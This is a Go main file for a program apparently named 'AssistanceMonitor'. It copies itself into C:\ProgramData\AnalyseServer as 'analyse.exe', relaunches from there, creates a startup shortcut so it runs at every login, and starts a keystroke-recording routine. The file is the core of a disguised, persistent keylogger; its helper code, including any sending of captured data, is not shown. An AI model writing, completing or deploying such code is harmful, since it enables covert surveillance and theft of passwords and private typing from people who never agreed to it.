package main

import (
	"log"
	"os"
	"path/filepath"
	"strings"

	"AssistanceMonitor/internal"
)

func main() {
	base := "C:\\ProgramData\\AnalyseServer"
	bin := base + "\\bin\\analyse.exe"

	internal.EnsureDirs(base)

	exe, err := internal.CurrentExe()
	if err != nil {
		log.Fatal(err)
	}

	if !strings.EqualFold(filepath.Clean(exe), filepath.Clean(bin)) {
		internal.CopySelf(bin)
		internal.Relaunch(bin)
		os.Exit(0)
	}

	internal.CreateStartupLink("AnalyseServer", bin)

	go internal.RecordKeys()

	internal.Timer()
}
